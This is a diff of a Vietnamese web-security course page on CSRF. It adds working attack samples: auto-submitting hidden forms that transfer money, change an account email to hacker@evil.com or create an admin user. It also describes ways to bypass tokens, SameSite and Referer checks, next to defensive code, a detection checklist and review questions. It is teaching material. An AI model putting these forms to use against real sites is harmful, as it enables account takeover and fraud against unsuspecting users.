@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 10: CSRF — Hieu Nguyen</title>
-  <meta name="description" content="CSRF điều kiện, SameSite, synchronizer token, API headers.">
+  <title>Chương 10: CSRF — Cross-Site Request Forgery — Hieu Nguyen</title>
+  <meta name="description" content="Chương 10: CSRF — Cross-Site Request Forgery — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,52 +40,321 @@
         <span>›</span>
         <span>10. CSRF</span>
       </div>
-      <h1>Chương 10: CSRF</h1>
-      <p class="lede">Trình duyệt tự gửi cookie. Site khác có thể “ký tên bạn” nếu bạn không có token chống giả.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> III — Client-side</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>CSRF: user đã login, cookie session tự đi theo request do trang khác khởi tạo. Server thấy phiên hợp lệ, thực hiện hành động user không cố ý.</p>
-<h2 id="dieu-kien">Điều kiện</h2>
-<ul>
-        <li>Hành động quan trọng dựa cookie (không thêm secret request).</li>
-        <li>Không token/SameSite đủ chặt.</li>
-        <li>User đang có phiên.</li>
-      </ul>
-<p>GET có side effect (unsubscribe, transfer) đặc biệt dễ. JSON thuần từ form cross-site khó hơn — đừng coi là đủ.</p>
-<h2 id="phong">Phòng chống</h2>
+      <div id="top"></div>
+<header><h1>Chương 10: CSRF — Cross-Site Request Forgery</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>CSRF</strong> (Cross-Site Request Forgery — Giả mạo yêu cầu chéo trang) là tấn công khiến người dùng đã xác thực vô tình thực hiện hành động không mong muốn trên một web application.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Trung bình-Cao — Phụ thuộc vào hành động có thể bị giả mạo (chuyển tiền, đổi email/password, xóa dữ liệu).</p>
+<p>CSRF khai thác sự thật: <strong>browser tự động gửi cookies trong mọi request</strong>, kể cả requests được trigger từ trang web khác.</p>
+<hr>
+<h2 id="điều-kiện-để-csrf-xảy-ra">Điều kiện để CSRF xảy ra</h2>
+<p>Cần đủ 3 điều kiện:</p>
 <ol>
-        <li>Synchronizer CSRF token (per-session hoặc per-form), kiểm tra server.</li>
-        <li>SameSite=Lax tối thiểu; Strict cho cookie nhạy.</li>
-        <li>API: custom header (framework set) + SameSite; không tin Origin/Referer một mình.</li>
-        <li>Re-auth cho hành động tiền / đổi email.</li>
-      </ol>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Cookie session thiếu SameSite trên Ingress. WAF rule CSRF không thay token app. Tách site thao tác (app) và site marketing origin.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Cookie tự gửi là gốc CSRF.</li>
-        <li>Token + SameSite.</li>
-        <li>Không side effect trên GET.</li>
-        <li>Hành động nhạy cần re-auth.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>CSRF khác XSS chỗ nào?</li>
-        <li>SameSite=Lax còn khe nào?</li>
-        <li>Vì sao GET transfer nguy hiểm?</li>
-        <li>Custom header giúp API thế nào?</li>
-        <li>Logout CSRF có đáng lo?</li>
-      </ol>
+<li><strong>Relevant action:</strong> Có hành động nhạy cảm (đổi email, chuyển tiền, thay đổi quyền)</li>
+<li><strong>Cookie-based session:</strong> App dùng cookie để track session</li>
+<li><strong>Predictable parameters:</strong> Hacker biết trước tất cả parameters cần thiết</li>
+</ol>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-text">Victim đang login bank.com (có session cookie)
 
-      <div class="docs-tags">
-        <span class="docs-tag">csrf</span>
-        <span class="docs-tag">samesite</span>
-        <span class="docs-tag">cookies</span>
-      </div>
+Hacker tạo trang evil.com với form ẩn:
+&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;to&quot; value=&quot;hacker_account&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;amount&quot; value=&quot;1000&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+Khi victim vào evil.com:
+1. Form tự submit đến bank.com
+2. Browser tự động đính kèm bank.com cookies
+3. bank.com thấy valid session → thực hiện transfer
+4. Hacker nhận 1000 đơn vị tiền
+</code></pre>
+<hr>
+<h2 id="các-loại-csrf-attack">Các loại CSRF Attack</h2>
+<h3 id="get-based-csrf">GET-based CSRF</h3>
+<p>Nếu sensitive action có thể trigger qua GET:</p>
+<pre><code class="language-html">&lt;!-- Load image từ target URL --&gt;
+&lt;img src=&quot;https://bank.com/transfer?to=hacker&amp;amount=1000&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;
+
+&lt;!-- Khi browser load image → gửi GET request với cookies → action thực hiện --&gt;
+</code></pre>
+<p><strong>Đây là lý do tại sao GET không nên có side effects.</strong></p>
+<h3 id="post-based-csrf">POST-based CSRF</h3>
+<pre><code class="language-html">&lt;!-- Auto-submit form --&gt;
+&lt;form action=&quot;https://example.com/email/change&quot; method=&quot;POST&quot; id=&quot;csrf-form&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker@evil.com&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#x27;csrf-form&#x27;).submit();&lt;/script&gt;
+</code></pre>
+<h3 id="json-based-csrf">JSON-based CSRF</h3>
+<p>Nhiều API dùng <code>Content-Type: application/json</code>. Browser chỉ auto-submit với <code>application/x-www-form-urlencoded</code> hoặc <code>multipart/form-data</code>.</p>
+<p>Nhưng có thể bypass:</p>
+<pre><code class="language-html">&lt;!-- Method 1: Dùng form với enctype text/plain (gây JSON-like format) --&gt;
+&lt;form action=&quot;https://api.example.com/change-email&quot; 
+      method=&quot;POST&quot; 
+      enctype=&quot;text/plain&quot;&gt;
+    &lt;input name=&#x27;{&quot;email&quot;:&quot;hacker@evil.com&quot;,&quot;x&quot;:&quot;&#x27; value=&#x27;&quot;}&#x27;&gt;
+&lt;/form&gt;
+
+&lt;!-- Body được gửi: {&quot;email&quot;:&quot;hacker@evil.com&quot;,&quot;x&quot;:&quot;=&quot;} --&gt;
+&lt;!-- Nếu server parse JSON lax → có thể work --&gt;
+
+&lt;!-- Method 2: Nếu server accept các Content-Type khác --&gt;
+&lt;script&gt;
+fetch(&#x27;https://api.example.com/change-email&#x27;, {
+    method: &#x27;POST&#x27;,
+    body: JSON.stringify({email: &#x27;hacker@evil.com&#x27;}),
+    // Không có Content-Type header → simple request → không có preflight
+    // Nhưng server cần handle request không có content-type
+})
+&lt;/script&gt;
+</code></pre>
+<hr>
+<h2 id="bypass-csrf-protection">Bypass CSRF Protection</h2>
+<h3 id="bypass-csrf-token">Bypass CSRF Token</h3>
+<p><strong>Token không được verify:</strong></p>
+<pre><code class="language-python"># SAI: Generate token nhưng không verify
+def change_email():
+    new_email = request.form.get(&#x27;email&#x27;)
+    # Token không được check!
+    db.update_email(session[&#x27;user_id&#x27;], new_email)
+</code></pre>
+<p><strong>Token tied to session nhưng không tied to user:</strong></p>
+<pre><code class="language-text">Hacker login → lấy CSRF token của hắn
+Dùng token của hắn trong request attack đến victim session
+→ Nếu server check &quot;token valid&quot; nhưng không check &quot;token belongs to this user&quot;
+</code></pre>
+<p><strong>Token trong URL (leaked qua Referer):</strong></p>
+<pre><code class="language-text">&lt;form action=&quot;/change-email?csrf_token=VALID_TOKEN&quot;&gt;
+→ Nếu page load external resource → Referer: /change-email?csrf_token=VALID_TOKEN
+→ Token bị leak!
+</code></pre>
+<p><strong>Double Submit Cookie bypass:</strong></p>
+<p>Một số app dùng pattern: cookie value == form field value.</p>
+<pre><code class="language-text">Nếu attacker có thể set cookie (XSS, subdomain takeover):
+→ Set attacker-controlled cookie value
+→ Send same value trong form field
+→ Server verify: cookie == form_field → match → bypass!
+</code></pre>
+<h3 id="bypass-samesitelax">Bypass SameSite=Lax</h3>
+<pre><code class="language-text">SameSite=Lax cho phép cookie trong top-level GET navigation:
+
+&lt;a href=&quot;https://victim.com/change-email?email=hacker@evil.com&quot;&gt;Click me!&lt;/a&gt;
+→ Nếu action accessible via GET với SameSite=Lax → CSRF vẫn possible
+</code></pre>
+<p><strong>Bypass bằng client-side redirect:</strong></p>
+<pre><code class="language-javascript">// Một số SameSite bypass qua client-side redirect
+// Nếu có page redirect từ victim.com → API endpoint:
+document.location = &#x27;https://victim.com/redirect?url=/api/change-email?email=h@evil.com&#x27;
+// Top-level navigation → SameSite=Lax cookies được gửi
+</code></pre>
+<h3 id="bypass-referer-validation">Bypass Referer Validation</h3>
+<p><strong>Empty Referer:</strong></p>
+<pre><code class="language-html">&lt;!-- Ẩn Referer header --&gt;
+&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;
+&lt;form ...&gt;
+→ Không có Referer header → nếu server chỉ block khi Referer sai (không khi thiếu) → bypass
+</code></pre>
+<p><strong>Referer chứa domain victim:</strong></p>
+<pre><code class="language-text">Hacker tạo subdomain hoặc path: victim.com.evil.com
+→ Referer: https://victim.com.evil.com/csrf.html
+→ Nếu server check &quot;victim.com&quot; in Referer → bypass!
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-account-takeover-qua-csrf">Kịch bản tấn công: Account Takeover qua CSRF</h2>
+<pre><code class="language-text">Target: admin panel của SaaS app
+Lỗ hổng: Không có CSRF token cho action &quot;Add admin user&quot;
+
+1. Hacker biết action:
+   POST /admin/users/add
+   name=hacker_admin&amp;email=hacker@evil.com&amp;role=admin
+
+2. Hacker tạo trang attack:
+</code></pre>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;https://app.example.com/admin/users/add&quot; 
+      method=&quot;POST&quot; 
+      id=&quot;csrf&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;hacker_admin&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker@evil.com&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;role&quot; value=&quot;admin&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&#x27;csrf&#x27;).submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code class="language-text">3. Hacker gửi link cho admin (phishing email, Slack message)
+4. Admin click → page load → form submit → admin account được tạo
+5. Hacker login với hacker@evil.com → full admin access
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Requests thay đổi state có CSRF token không?
+□ Token unique per-session và per-request?
+□ Token được verify server-side?
+□ Token trong URL (bị leak qua Referer)?
+□ SameSite cookie attribute được set?
+□ Referer validation có bypass được không (empty, misleading value)?
+□ Sensitive actions có thể trigger qua GET?
+□ Double submit cookie pattern có subdomain XSS risk?
+</code></pre>
+<p><strong>Test bằng Burp:</strong></p>
+<ol>
+<li>Intercept request thay đổi state</li>
+<li>Xóa CSRF token parameter</li>
+<li>Send request → nếu thành công → CSRF</li>
+<li>Thử sửa token value → nếu thành công → validation lỗi</li>
+</ol>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="1-synchronizer-token-pattern-cách-tốt-nhất">1. Synchronizer Token Pattern (Cách tốt nhất)</h3>
+<pre><code class="language-python">import secrets
+from functools import wraps
+
+def generate_csrf_token():
+    &quot;&quot;&quot;Tạo CSRF token unique per-session&quot;&quot;&quot;
+    if &#x27;csrf_token&#x27; not in session:
+        session[&#x27;csrf_token&#x27;] = secrets.token_hex(32)
+    return session[&#x27;csrf_token&#x27;]
+
+def csrf_protect(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if request.method in (&#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;PATCH&#x27;, &#x27;DELETE&#x27;):
+            token = request.form.get(&#x27;csrf_token&#x27;) or \
+                    request.headers.get(&#x27;X-CSRF-Token&#x27;)
+            
+            if not token or not secrets.compare_digest(
+                token, session.get(&#x27;csrf_token&#x27;, &#x27;&#x27;)
+            ):
+                abort(403, &quot;CSRF token validation failed&quot;)
+        return f(*args, **kwargs)
+    return decorated
+
+# Template
+@app.route(&#x27;/change-email&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])
+@csrf_protect
+def change_email():
+    if request.method == &#x27;GET&#x27;:
+        return render_template(&#x27;change_email.html&#x27;, 
+                               csrf_token=generate_csrf_token())
+    # POST: đã được validate bởi decorator
+    ...
+</code></pre>
+<pre><code class="language-html">&lt;!-- Template --&gt;
+&lt;form method=&quot;POST&quot; action=&quot;/change-email&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;{{ csrf_token }}&quot;&gt;
+    &lt;input type=&quot;email&quot; name=&quot;email&quot; required&gt;
+    &lt;button type=&quot;submit&quot;&gt;Change Email&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+<h3 id="2-samesite-cookie">2. SameSite Cookie</h3>
+<pre><code class="language-python">response.set_cookie(
+    &#x27;session&#x27;,
+    session_id,
+    samesite=&#x27;Strict&#x27;,  # Hoặc &#x27;Lax&#x27; nếu cần cross-site navigation
+    httponly=True,
+    secure=True
+)
+</code></pre>
+<h3 id="3-custom-request-header-cho-ajaxapi">3. Custom Request Header (cho AJAX/API)</h3>
+<pre><code class="language-javascript">// Frontend: luôn gửi custom header
+fetch(&#x27;/api/change-email&#x27;, {
+    method: &#x27;POST&#x27;,
+    headers: {
+        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,
+        &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,  // Custom header
+    },
+    credentials: &#x27;same-origin&#x27;,
+    body: JSON.stringify({email: &#x27;new@email.com&#x27;})
+});
+</code></pre>
+<pre><code class="language-python"># Backend: check custom header
+@app.before_request
+def check_ajax_requests():
+    if request.method in (&#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;):
+        if request.content_type == &#x27;application/json&#x27;:
+            if request.headers.get(&#x27;X-Requested-With&#x27;) != &#x27;XMLHttpRequest&#x27;:
+                abort(403)
+</code></pre>
+<p>Simple cross-site requests không thể add custom headers (bị browser block) → đây là defense theo origin.</p>
+<h3 id="4-double-submit-cookie-với-subresource-integrity">4. Double Submit Cookie (với Subresource Integrity)</h3>
+<pre><code class="language-python"># Generate token
+csrf_token = secrets.token_hex(32)
+# Set cookie và form field với cùng giá trị
+response.set_cookie(&#x27;csrf_token&#x27;, csrf_token, samesite=&#x27;Strict&#x27;)
+session[&#x27;csrf_secret&#x27;] = hashlib.sha256(csrf_token.encode()).hexdigest()
+
+# Verify
+def verify_csrf():
+    cookie_token = request.cookies.get(&#x27;csrf_token&#x27;)
+    form_token = request.form.get(&#x27;csrf_token&#x27;)
+    expected = session.get(&#x27;csrf_secret&#x27;)
+    
+    if not all([cookie_token, form_token, expected]):
+        return False
+    
+    return secrets.compare_digest(
+        hashlib.sha256(form_token.encode()).hexdigest(),
+        expected
+    )
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Nginx: Validate Origin/Referer:</strong></p>
+<pre><code class="language-nginx"># Reject requests từ unexpected origins
+map $http_origin $bad_origin {
+    default 1;
+    &quot;https://app.example.com&quot; 0;
+    &quot;https://admin.example.com&quot; 0;
+}
+
+location /api/ {
+    if ($bad_origin = 1) {
+        return 403;
+    }
+}
+</code></pre>
+<p><strong>Kubernetes: Security Headers qua Ingress:</strong></p>
+<pre><code class="language-yaml">annotations:
+  nginx.ingress.kubernetes.io/configuration-snippet: |
+    add_header X-Frame-Options &quot;DENY&quot;;
+    add_header X-Content-Type-Options &quot;nosniff&quot;;
+</code></pre>
+<p><strong>Testing trong CI/CD:</strong></p>
+<pre><code class="language-bash"># Test CSRF protection trong pipeline
+python -m pytest tests/security/test_csrf.py -v
+
+# Hoặc dùng OWASP ZAP
+docker run owasp/zap2docker-stable \
+  zap-api-scan.py \
+  -t https://staging.example.com/openapi.json \
+  -r csrf-report.html
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>CSRF khai thác việc browser tự gửi cookies trong mọi request kể cả từ trang khác.</li>
+<li>Ba điều kiện: relevant action + cookie session + predictable parameters.</li>
+<li>Biện pháp hiệu quả nhất: CSRF token (synchronizer pattern) kết hợp SameSite cookies.</li>
+<li>GET request không nên có side effects.</li>
+<li>Referer validation không đủ — dễ bypass bằng empty referer hoặc misleading URL.</li>
+<li>SameSite=Strict là bảo vệ tốt nhất nhưng có thể ảnh hưởng UX.</li>
+<li>Custom header (X-Requested-With) là biện pháp tốt cho AJAX-only APIs.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Ba điều kiện cần thiết để CSRF attack thành công là gì?</li>
+<li>Tại sao SameSite=Lax không hoàn toàn ngăn chặn CSRF?</li>
+<li>Double Submit Cookie pattern là gì và điểm yếu của nó là gì?</li>
+<li>Tại sao Referer header validation không phải là biện pháp bảo mật đáng tin cậy?</li>
+<li>Với REST API chỉ nhận JSON, biện pháp nào phòng chống CSRF tốt nhất?</li>
+</ol>
       <div class="docs-pager">
         <a href="../09/">Previous · 09. CORS</a>
         <a href="../11/">Next · 11. XSS</a>
@@ -94,12 +363,27 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#dieu-kien">Điều kiện</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#điều-kiện-để-csrf-xảy-ra">Điều kiện để CSRF xảy ra</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#các-loại-csrf-attack">Các loại CSRF Attack</a>
+        <a class="depth-3" href="#get-based-csrf">GET-based CSRF</a>
+        <a class="depth-3" href="#post-based-csrf">POST-based CSRF</a>
+        <a class="depth-3" href="#json-based-csrf">JSON-based CSRF</a>
+        <a href="#bypass-csrf-protection">Bypass CSRF Protection</a>
+        <a class="depth-3" href="#bypass-csrf-token">Bypass CSRF Token</a>
+        <a class="depth-3" href="#bypass-samesitelax">Bypass SameSite=Lax</a>
+        <a class="depth-3" href="#bypass-referer-validation">Bypass Referer Validation</a>
+        <a href="#kịch-bản-tấn-công-account-takeover-qua-csrf">Kịch bản tấn công: Account Takeover qua CSRF</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#1-synchronizer-token-pattern-cách-tốt-nhất">1. Synchronizer Token Pattern (Cách tốt nhất)</a>
+        <a class="depth-3" href="#2-samesite-cookie">2. SameSite Cookie</a>
+        <a class="depth-3" href="#3-custom-request-header-cho-ajaxapi">3. Custom Request Header (cho AJAX/API)</a>
+        <a class="depth-3" href="#4-double-submit-cookie-với-subresource-integrity">4. Double Submit Cookie (với Subresource Integrity)</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
